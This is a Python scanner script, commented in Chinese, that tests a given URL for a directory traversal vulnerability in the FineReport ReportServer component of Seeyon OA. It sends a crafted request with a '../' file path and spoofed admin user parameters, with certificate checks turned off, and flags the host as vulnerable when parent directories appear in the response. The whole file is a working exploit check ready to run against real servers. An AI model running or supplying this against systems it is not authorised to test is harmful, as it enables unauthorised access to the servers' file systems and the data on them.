#!/usr/bin/env python
# coding=utf-8
#致远OA帆软组件ReportServer目录遍历漏洞
import requests, threading
from termcolor import colored
requests.packages.urllib3.disable_warnings()  #忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url +'/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true', verify=False,timeout=20)
        if '../seeyonreport' in response.text and '../yyoa' in response.text and '../ROOT' in response.text:
            print(colored('[+]存在致远OA帆软组件ReportServer目录遍历漏洞', 'red'))
            results = f'{urls}-->存在致远OA帆软组件ReportServer目录遍历漏洞'
        else:
            print('[-]不存在致远OA帆软组件ReportServer目录遍历漏洞')
    except:
        print('[-]不存在致远OA帆软组件ReportServer目录遍历漏洞')


def zhiyuanOAFANGml(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln,args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
